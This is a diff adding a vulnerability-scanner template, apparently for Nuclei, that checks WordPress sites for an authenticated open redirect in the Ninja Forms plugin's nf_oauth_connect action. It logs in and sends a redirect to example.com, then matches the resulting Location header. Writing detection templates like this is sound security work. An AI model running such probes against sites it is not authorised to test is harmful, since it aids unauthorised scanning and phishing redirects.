@@ -1,0 +1,35 @@
+id: ninjaform-open-redirect
+
+info:
+  name: Ninja Forms < 3.4.34 - Administrator Open Redirect
+  author: dhiyaneshDk,daffainfo
+  severity: low
+  description: The wp_ajax_nf_oauth_connect AJAX action was vulnerable to open redirect due to the use of a user supplied redirect parameter and no protection in place.
+  reference:
+    - https://wpscan.com/vulnerability/6147acf5-e43f-47e6-ab56-c9c8be584818
+  tags: wordpress,redirect,wp-plugin,ninjaform,authenticated,wp
+
+requests:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+
+      - |
+        GET /wp-admin/admin-ajax.php?client_id=1&redirect=https://example.com&action=nf_oauth_connect HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 302'
+          - 'status_code_2 == 302'
+          - "contains(all_headers_2, 'Location: https://example.com?client_id=1')"
+        condition: and
